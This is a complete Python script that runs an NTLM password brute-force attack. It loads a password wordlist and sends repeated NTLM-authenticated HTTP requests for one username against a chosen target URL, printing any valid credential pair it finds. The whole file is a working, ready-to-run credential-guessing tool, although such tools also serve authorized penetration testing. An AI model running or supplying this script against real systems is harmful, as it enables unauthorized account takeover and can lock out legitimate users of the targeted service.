#!/usr/bin/python3

import requests
from requests_ntlm import HttpNtlmAuth
import sys
import argparse

# Class definition for NTLMSprayer
class NTLMSprayer:
    def __init__(self, fqdn):
        # Constructor that initializes the NTLMSprayer class
        self.HTTP_AUTH_FAILED_CODE = 401  # HTTP status code for unauthorized
        self.HTTP_AUTH_SUCCEED_CODE = 200  # HTTP status code for success
        self.verbose = True  # Boolean to control verbose output
        self.fqdn = fqdn  # Fully Qualified Domain Name passed during class initialization

    def load_passwords(self, password_file):
        # Method to load passwords from a specified file
        self.passwords = []  # Initialize an empty list to store passwords
        with open(password_file, 'r') as f:  # Open the password file in read mode
            lines = f.readlines()  # Read all lines from the file
            for line in lines:  # Iterate over each line
                self.passwords.append(line.strip())  # Remove whitespace and add to the password list

    def brute_force_password(self, username, url):
        # Method to perform a brute-force password attack for a single user
        print(f"[*] Starting brute-force attack for user: {username}")  # Print starting message
        for password in self.passwords:  # Iterate over each password in the list
            # Attempt to authenticate using the NTLM authentication method
            response = requests.get(url, auth=HttpNtlmAuth(f"{self.fqdn}\\{username}", password))
            # Check if the response status code indicates a successful authentication
            if response.status_code == self.HTTP_AUTH_SUCCEED_CODE:
                print(f"[+] Valid credential pair found! Username: {username} Password: {password}")  # Print valid credentials
                return  # Stop brute-forcing as valid credentials are found
            # Check if the response status code indicates a failed authentication and if verbose mode is enabled
            if self.verbose and response.status_code == self.HTTP_AUTH_FAILED_CODE:
                print(f"[-] Failed login with Username: {username} and Password: {password}")  # Print failure message for this password

        # Print a message if no valid credentials were found
        print(f"[*] Brute-force attack completed for user: {username}. No valid credentials found.")

# Main function to handle command-line execution
def main():
    # Create an ArgumentParser object for command-line arguments
    parser = argparse.ArgumentParser(description='Perform an NTLM brute-force attack.')
    parser.add_argument('-u', '--username', required=True, help='Username to perform brute-force on')  # Argument for username
    parser.add_argument('-f', '--fqdn', required=True, help='Fully Qualified Domain Name (FQDN)')  # Argument for FQDN
    parser.add_argument('-w', '--wordlist', required=True, help='Path to the password wordlist file')  # Argument for password wordlist
    parser.add_argument('-a', '--attackurl', required=True, help='URL of the target for the attack')  # Argument for attack URL

    args = parser.parse_args()  # Parse command-line arguments

    # Start the brute-force attack using the provided arguments
    sprayer = NTLMSprayer(args.fqdn)  # Create an instance of NTLMSprayer with the specified FQDN
    sprayer.load_passwords(args.wordlist)  # Load passwords from the specified wordlist file
    sprayer.brute_force_password(args.username, args.attackurl)  # Perform the brute-force attack

# Check if this script is being executed directly (as opposed to being imported as a module)
if __name__ == "__main__":
    main()  # Call the main function to execute the script
